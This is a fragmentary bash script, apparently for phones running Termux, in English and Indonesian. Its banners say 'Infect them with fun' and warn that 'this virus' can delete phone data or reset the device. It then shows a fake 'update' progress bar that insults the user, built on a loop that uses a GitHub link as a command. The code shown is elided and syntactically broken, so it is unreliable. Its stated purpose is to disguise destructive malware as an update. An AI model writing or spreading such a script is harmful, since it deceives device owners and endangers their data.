...
echo " " 
echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
echo -e "$red                      ⫸$ylo  BY AUDDY$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Infect them with fun]$rset"
echo " "
...
VIRUS INI SANGAT BERBAHAYA GUNAKAN DENGAN BIJAK
   VIRUS INI BISA HAPUSS DATA DATA HP ATAU RISET.
                                👇👇👇
...
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON,TUNGGU ANJING WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while https://github.com/Dpixauddy/auddy.cb2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
